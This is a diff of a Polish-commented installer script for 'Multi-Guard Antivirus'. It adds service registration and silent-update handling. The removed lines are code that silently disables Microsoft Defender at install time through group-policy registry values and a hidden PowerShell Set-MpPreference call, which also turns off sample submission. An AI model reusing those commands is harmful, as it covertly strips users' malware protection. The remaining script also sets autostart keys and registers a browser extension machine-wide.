@@ -56,21 +56,19 @@ Name: "{commonstartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
 Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "{#MyAppName}"; ValueData: """{app}\{#MyAppExeName}"" --tray"; Flags: uninsdeletevalue
 Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "{#MyAppName}"; ValueData: """{app}\{#MyAppExeName}"" --tray"; Flags: uninsdeletevalue
 
-; Wyłączenie Microsoft Defender w rejestrze systemowym (zasady grupy)
-Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender"; ValueType: dword; ValueName: "DisableAntiSpyware"; ValueData: 1; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender"; ValueType: dword; ValueName: "DisableAntiVirus"; ValueData: 1; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; ValueType: dword; ValueName: "DisableRealtimeMonitoring"; ValueData: 1; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; ValueType: dword; ValueName: "DisableBehaviorMonitoring"; ValueData: 1; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; ValueType: dword; ValueName: "DisableOnAccessProtection"; ValueData: 1; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; ValueType: dword; ValueName: "DisableScanOnRealtimeEnable"; ValueData: 1; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; ValueType: dword; ValueName: "DisableIOAVProtection"; ValueData: 1; Flags: uninsdeletevalue
-Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; ValueType: dword; ValueName: "DisableScriptScanning"; ValueData: 1; Flags: uninsdeletevalue
+[Dirs]
+Name: "{app}"; Permissions: system-full administrators-full authusers-r
+Name: "{commonappdata}\Multi-Guard"; Permissions: system-full administrators-full authusers-modify
 
 [Run]
-Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
+Filename: "{app}\{#MyAppExeName}"; Parameters: "--install-service"; StatusMsg: "Rejestrowanie usługi Multi-Guard Antivirus..."; Flags: runhidden
+Filename: "{app}\{#MyAppExeName}"; Parameters: "--start-service"; StatusMsg: "Uruchamianie ochrony w tle..."; Flags: runhidden
+Filename: "{app}\{#MyAppExeName}"; Parameters: "--tray"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
 
 [UninstallRun]
-; Wyrejestrowanie z Windows Security Center przed deinstalacją
+; Zatrzymanie i wyrejestrowanie usługi systemowej oraz czyszczenie rejestracji
+Filename: "{app}\{#MyAppExeName}"; Parameters: "--stop-service"; Flags: runhidden
+Filename: "{app}\{#MyAppExeName}"; Parameters: "--uninstall-service"; Flags: runhidden
 Filename: "{app}\{#MyAppExeName}"; Parameters: "--uninstall"; Flags: runhidden
 
 [Code]
@@ -114,6 +112,7 @@ var
   Key: String;
 begin
   Result := True;
+  if WizardSilent then Exit;
   if CurPageID = LicensePage.ID then begin
     Key := Trim(LicensePage.Values[0]);
     if Key = '' then begin
@@ -149,9 +148,6 @@ begin
       SaveStringToFile(KeyDir + '\license.key', Key, False);
     end;
 
-    // Wyłączenie Microsoft Defender w momencie instalacji Multi-Guard
-    Exec('powershell.exe', '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableIntrusionPreventionSystem $true -DisableArchiveScanning $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
-
     // Rejestracja rozszerzenia Multi-Guard WebShield w przeglądarkach Chrome i Edge
     RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Google\Chrome\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
     RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Google\Chrome\Extensions\multiguard_webshield', 'version', '1.2.0');
@@ -162,5 +158,10 @@ begin
     RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Edge\Extensions\multiguard_webshield', 'version', '1.2.0');
     RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Microsoft\Edge\Extensions\multiguard_webshield', 'path', ExpandConstant('{app}\browser_extension'));
     RegWriteStringValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Microsoft\Edge\Extensions\multiguard_webshield', 'version', '1.2.0');
+
+    // W przypadku cichej aktualizacji z programu automatycznie uruchom nową wersję
+    if WizardSilent then begin
+      Exec(ExpandConstant('{app}\{#MyAppExeName}'), '', '', SW_SHOWNORMAL, ewNoWait, ResultCode);
+    end;
   end;
 end;
